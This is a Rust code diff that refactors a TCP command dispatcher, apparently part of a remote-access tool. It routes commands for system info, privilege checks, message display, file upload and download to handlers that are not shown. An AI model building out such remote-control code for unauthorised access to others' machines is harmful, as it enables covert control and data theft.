@@ -1,21 +1,24 @@
 use std::net::TcpStream;
 
-pub mod filesystem;
-pub mod system; 
+use shared::InstructMessage;
 
-pub fn dispatch(instruct: Vec<&str>, conn: &mut TcpStream) -> Result<bool, String> {    
-    match instruct.first() {
-        Some(&"q") => Ok(false), 
+pub mod filesystem;
+pub mod system;
+
+pub fn dispatch(instruct: InstructMessage, conn: &mut TcpStream) -> Result<bool, String> {
+    match instruct {
+        // Close
+        InstructMessage::Close => Ok(false),
 
         // System interaction
-        Some(&"sysinfo") => system::sysinfo(conn),
-        Some(&"check") => system::check_privileges(conn),
-        Some(&"display") => system::display_message(&instruct),
+        InstructMessage::SysInfo => system::sysinfo(conn), // sysinfo
+        InstructMessage::Check => system::check_privileges(conn), // check
+        InstructMessage::Display(content) => system::display_message(content), // display
 
         // FileSystem
-        Some(&"download") => filesystem::download(&instruct, conn),
-
+        InstructMessage::Upload => filesystem::upload(conn),
+        InstructMessage::Download(path) => filesystem::download(path, conn),
         // No registered command
-        _ => Ok(true)
+        // _ => Ok(true)
     }
 }
